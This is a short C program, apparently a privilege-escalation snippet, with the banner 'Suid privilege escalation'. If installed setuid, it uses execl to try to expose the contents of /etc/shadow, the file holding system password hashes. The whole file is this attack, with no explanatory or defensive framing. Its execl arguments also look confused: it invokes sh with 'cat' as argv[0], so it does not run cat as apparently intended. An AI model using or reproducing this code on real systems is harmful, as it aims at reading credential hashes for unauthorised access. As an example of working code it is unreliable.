#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
    printf("\n#### Suid privilege escalation ####\n\n");
    execl("/usr/bin/sh", "/usr/bin/cat", "/etc/shadow", NULL);
    return 0;
}